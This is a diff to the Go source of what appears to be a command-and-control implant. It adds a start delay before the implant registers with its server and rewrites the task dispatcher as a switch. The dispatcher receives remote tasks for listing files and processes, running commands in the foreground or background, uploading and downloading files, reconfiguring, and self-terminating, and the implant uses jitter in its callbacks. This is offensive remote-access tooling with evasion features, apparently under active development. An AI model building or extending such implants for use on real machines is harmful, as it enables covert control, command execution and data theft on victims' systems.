@@ -16,7 +16,7 @@ import (
 	"time"
 )
 
-var callbackTimer = CallbackInfo{Callback_freq: 1, Jitter: 15, SelfTerminate: 20}
+var callbackTimer = CallbackInfo{Callback_freq: 1, Jitter: 15, SelfTerminate: 20, StartDelay: 5}
 
 var customClient = &http.Client{
 	Transport: &http.Transport{
@@ -181,27 +181,26 @@ func ParseTasks(serverUrl string, tasking string) (string, error) {
 
 	for _, taskData := range tasks {
 		url := fmt.Sprintf("%s/results/%s", serverUrl, taskData["session"])
-
-		if taskData["task"] == "ls" {
+		switch taskData["task"] {
+		case "ls":
 			LsHandler(url, taskData)
-		} else if taskData["task"] == "ps" {
+		case "ps":
 			PsHandler(url, taskData)
-		} else if taskData["task"] == "exec_bg" {
+		case "exec_bg":
 			ExecBgHandler(url, taskData)
-		} else if taskData["task"] == "exec_fg" {
+		case "exec_fg":
 			ExecFgHandler(url, taskData)
-		} else if taskData["task"] == "reconfig" {
+		case "reconfig":
 			ReconfigHandler(url, taskData)
-		} else if taskData["task"] == "kill" {
+		case "kill":
 			sendDeathMessage(serverUrl, taskData["session"].(string))
 			DataShipper(url, taskData, "true")
 			TerminateImplant()
-		} else if taskData["task"] == "download" {
+		case "download":
 			DownloadHandler(url, taskData)
-		} else if taskData["task"] == "upload" {
+		case "upload":
 			UploadHandler(url, taskData)
 		}
-
 	}
 	return "", nil
 }
@@ -229,6 +228,8 @@ func main() {
 	serverUrl := "https://192.168.15.172:8000"
 
 	initialInfo := GatherInfo()
+
+	time.Sleep(time.Duration(callbackTimer.StartDelay) * time.Second)
 
 	// register with server
 	_, err := PostJson(serverUrl+"/implants/", initialInfo)
